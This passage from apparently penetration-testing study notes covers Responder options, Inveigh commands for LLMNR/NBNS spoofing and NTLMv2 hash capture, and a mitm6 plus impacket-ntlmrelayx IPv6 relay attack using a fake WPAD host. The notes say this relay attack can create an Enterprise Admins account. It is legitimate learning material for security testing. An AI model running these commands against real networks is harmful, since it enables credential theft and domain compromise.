| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-A`           | Act as a fly on the wall and listen to the traffic                                                                                                                                                                                                                                                                              |
| `-w`           | Rogue WPAD server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has [Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) enabled. |
| `-f`           | Fingerprint machine                                                                                                                                                                                                                                                                                                             |
| `-F`      `-P` | Force orce NTLM or Basic authentication and force proxy authentication, but may cause a login prompt, so they should be used sparingly                                                                                                                                                                                          |
| `-d`           | Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response.                                                                                                                                                                                                                         |
### [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth

Powershell based Inveigh - LLMNR and NBNS Spoofing
```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

C# Inveigh (InveighZero)
```powershell
.\Inveigh.exe
Press ESC to enter/exit interactive console
HELP
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```
The options with a `[+]` are default and enabled by default and the ones with a `[ ]` before them are disabled.

### IPv6 Attacks

```bash
sudo mitm6 -i eth0 -d PNPT.local
```

```bash
impacket-ntlmrelayx -6 -t ldaps://192.168.1.129 -wh evil.PNPT.local -l lootme
```

```bash
jq -r '.[] | .attributes.sAMAccountName[0]' domain_users.json
```

Typically machines on networks run on IPv4, sometimes not even utilizing IPv6 at all but still have it enabled by default. In a network there is usually **nobody** doing DNS for IPv6

We can leverage this by replying to all DHCPv6 messages, giving them a Link-Local address and telling them that we're their default DNS server.

**MITM6** paired with **Impacket-ntlmrelayx** using **LDAP relaying,** can allow us to pull a lot of information from the Domain Controller and even create a new user account in the Enterprise Admins group when a Domain Administrator logs into the network. This can allow us to run secretsdump against the Domain Controller.
